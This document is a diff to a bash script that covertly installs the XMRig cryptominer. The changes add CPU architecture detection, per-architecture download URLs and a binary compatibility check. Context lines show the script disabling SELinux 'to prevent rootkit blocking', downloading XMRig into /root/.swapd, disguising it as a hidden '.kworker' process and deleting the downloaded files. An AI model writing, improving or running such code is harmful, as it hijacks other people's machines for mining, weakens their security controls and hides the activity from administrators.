@@ -1,5 +1,97 @@
 #!/bin/bash
 
+# ==================== INTERACTIVE ARCHITECTURE SELECTION ====================
+echo ""
+echo "=========================================="
+echo "ARCHITECTURE SELECTION"
+echo "=========================================="
+echo ""
+
+# Auto-detect architecture
+DETECTED_ARCH=$(uname -m)
+echo "[*] Auto-detected architecture: $DETECTED_ARCH"
+echo ""
+
+# Map to supported types
+case "$DETECTED_ARCH" in
+    x86_64|amd64)
+        SUGGESTED_CHOICE="1"
+        ARCH_NAME="x86_64 (Intel/AMD 64-bit)"
+        ;;
+    aarch64|arm64)
+        SUGGESTED_CHOICE="2"
+        ARCH_NAME="ARM64 (64-bit ARM - Raspberry Pi 4, etc.)"
+        ;;
+    armv7l|armhf|armv6l)
+        SUGGESTED_CHOICE="3"
+        ARCH_NAME="ARMv7/ARMv6 (32-bit ARM - routers, old Pi)"
+        ;;
+    i686|i386)
+        SUGGESTED_CHOICE="4"
+        ARCH_NAME="x86 (32-bit Intel/AMD - NOT SUPPORTED)"
+        ;;
+    mips|mipsel|mips64)
+        SUGGESTED_CHOICE="5"
+        ARCH_NAME="MIPS (routers - NOT SUPPORTED)"
+        ;;
+    *)
+        SUGGESTED_CHOICE="6"
+        ARCH_NAME="Unknown: $DETECTED_ARCH"
+        ;;
+esac
+
+echo "Detected: $ARCH_NAME"
+echo ""
+echo "Select your CPU architecture:"
+echo "  1) x86_64 / amd64    (Intel/AMD 64-bit servers)"
+echo "  2) ARM64 / aarch64   (Raspberry Pi 4, ARM servers)"
+echo "  3) ARMv7 / ARMv6     (32-bit ARM - routers, old Raspberry Pi)"
+echo "  4) x86 / i686        (32-bit Intel/AMD - NOT SUPPORTED)"
+echo "  5) MIPS              (Routers - NOT SUPPORTED)"
+echo "  6) Skip/Auto-detect  (Use detected: $DETECTED_ARCH)"
+echo ""
+echo -n "Enter choice [1-6] (default: $SUGGESTED_CHOICE): "
+
+# Check if running non-interactively
+if [ -t 0 ]; then
+    read -r ARCH_CHOICE
+else
+    ARCH_CHOICE=""
+    echo "[non-interactive mode]"
+fi
+
+# Use suggested if no input
+ARCH_CHOICE=${ARCH_CHOICE:-$SUGGESTED_CHOICE}
+
+case "$ARCH_CHOICE" in
+    1)
+        FORCE_ARCH="x86_64"
+        echo "[*] Selected: x86_64"
+        ;;
+    2)
+        FORCE_ARCH="aarch64"
+        echo "[*] Selected: ARM64"
+        ;;
+    3)
+        FORCE_ARCH="armv7l"
+        echo "[*] Selected: ARMv7 (will use cpuminer-multi instead of XMRig)"
+        ;;
+    4)
+        echo "[!] ERROR: x86 32-bit is NOT supported by modern miners"
+        exit 1
+        ;;
+    5)
+        echo "[!] ERROR: MIPS is NOT supported by XMRig or cpuminer-multi"
+        exit 1
+        ;;
+    6|*)
+        FORCE_ARCH="$DETECTED_ARCH"
+        echo "[*] Using auto-detected: $DETECTED_ARCH"
+        ;;
+esac
+
+echo ""
+
 # ==================== SELINUX DISABLE ====================
 # Disable SELinux temporarily to prevent rootkit blocking
 echo "[*] Disabling SELinux..."
@@ -914,15 +1006,57 @@ cd /root/.swapd || {
     }
 }
 
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+XMRIG_VERSION="6.21.0"
+
+# Select correct binary based on architecture
+case "$ARCH" in
+    x86_64|amd64)
+        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-x64.tar.gz"
+        XMRIG_ARCH="x64"
+        ;;
+    i686|i386)
+        echo "[!] ERROR: 32-bit x86 is NOT supported by XMRig 6.x"
+        echo "[!] Please use a 64-bit system or manually compile an older version"
+        exit 1
+        ;;
+    aarch64|arm64)
+        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-arm64.tar.gz"
+        XMRIG_ARCH="arm64"
+        ;;
+    armv7l|armhf)
+        echo "[!] ERROR: ARMv7 (32-bit ARM) is NOT supported by official XMRig releases"
+        echo "[!] You must compile XMRig from source on this architecture"
+        echo ""
+        echo "Manual compilation required:"
+        echo "  git clone https://github.com/xmrig/xmrig.git"
+        echo "  cd xmrig && mkdir build && cd build"
+        echo "  cmake .. -DARM_TARGET=7"
+        echo "  make -j\$(nproc)"
+        exit 1
+        ;;
+    mips|mipsel|mips64)
+        echo "[!] ERROR: MIPS architecture is NOT supported by XMRig"
+        echo "[!] Architecture: $ARCH"
+        echo "[!] XMRig only supports x86_64 and ARM64"
+        exit 1
+        ;;
+    *)
+        echo "[!] ERROR: Unsupported architecture: $ARCH"
+        echo "[!] XMRig only supports: x86_64, ARM64"
+        echo "[!] Your system: $ARCH"
+        exit 1
+        ;;
+esac
+
+echo "[*] Selected architecture: $XMRIG_ARCH"
+
 DOWNLOAD_SUCCESS=false
 ATTEMPTS=0
 MAX_ATTEMPTS=3
 
 # Multiple mirrors in case GitHub is blocked or slow
 MIRRORS=(
-    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
-    "https://objects.githubusercontent.com/github-production-release-asset-2e65be/78932994/d7c9e680-8a63-11ee-9fa2-d9fb1a654e30?X-Amz-Algorithm=AWS4-HMAC-SHA256"
+    "$XMRIG_URL"
 )
 
 # Expected tarball size (approximately 3.5MB)
@@ -1016,8 +1150,35 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
         chmod +x .kworker 2>/dev/null || true
-        rm -rf xmrig-* xmrig.tar.gz
-        echo "[✓] XMRig downloaded and renamed to '.kworker' (hidden)"
+        
+        # CRITICAL: Test if binary is actually executable on this system
+        echo "[*] Testing binary compatibility..."
+        if ./.kworker --version >/dev/null 2>&1; then
+            echo "[✓] Binary is compatible with this system"
+            rm -rf xmrig-* xmrig.tar.gz
+            echo "[✓] XMRig downloaded and renamed to '.kworker' (hidden)"
+        else
+            echo "[!] ERROR: Binary downloaded but cannot execute on this system!"
+            echo "[!] Architecture mismatch detected"
+            
+            # Try to get more info
+            if command -v file >/dev/null 2>&1; then
+                echo "[*] Binary info:"
+                file .kworker
+            fi
+            
+            echo "[*] System info:"
+            echo "    uname -m: $(uname -m)"
+            echo "    uname -s: $(uname -s)"
+            
+            # Check if we downloaded the wrong binary
+            if file .kworker 2>/dev/null | grep -q "x86-64" && [ "$ARCH" != "x86_64" ]; then
+                echo "[!] Downloaded x86_64 binary for $ARCH system - this is a bug!"
+            fi
+            
+            rm -rf xmrig-* xmrig.tar.gz .kworker
+            DOWNLOAD_SUCCESS=false
+        fi
     fi
 fi
 
